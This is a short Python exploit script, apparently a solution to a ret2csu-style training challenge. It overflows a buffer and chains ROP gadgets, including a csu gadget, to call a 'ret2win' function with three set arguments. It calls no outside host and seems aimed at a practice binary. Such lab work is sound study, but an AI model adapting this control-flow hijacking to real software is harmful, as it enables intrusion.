#!/usr/bin/python3

import struct
import sys

p64 = lambda x: struct.pack("<Q", x)
buff = b"A" * 32
buff += p64(1)

pr = lambda x: sys.stdout.buffer.write(x); sys.stdout.buffer.flush()

# at the time of `call   QWORD PTR [r12+rbx*8]` rbx = 0 and r12 can be controlled
rop = [
    p64(0x000000000040069c), # pop r12; pop r13; pop r14; pop r15; ret;
    p64(0x0000000000600e48), # 0x600e48 -> 0x004006b4 -> sub rsp, 0x8; add rsp, 0x8; ret 
    p64(0x0000000000000001), # fist arg rdi, will be overwritten later
    p64(0xcafebabecafebabe), # second arg r14 -> rsi
    p64(0xd00df00dd00df00d), # third arg r15 -> rdx

    p64(0x0000000000400680), # mov rdx, r15 ... call [r12+rbx*] where rbx == 0

    # dummy values
    p64(0x0000000000000001), # add rsp, 0x8
    p64(0x0000000000000001), # pop rbx
    p64(0x0000000000000001), # pop rbp
    p64(0x0000000000000001), # pop r12
    p64(0x0000000000000001), # pop r13
    p64(0x0000000000000001), # pop r14
    p64(0x0000000000000001), # pop r15

    p64(0x00000000004006a3), # pop rdi; ret;
    p64(0xdeadbeefdeadbeef), # first arg on rdi 
    p64(0x0000000000400510), # call ret2win
]

payload = buff + b''.join(rop)

pr(payload)
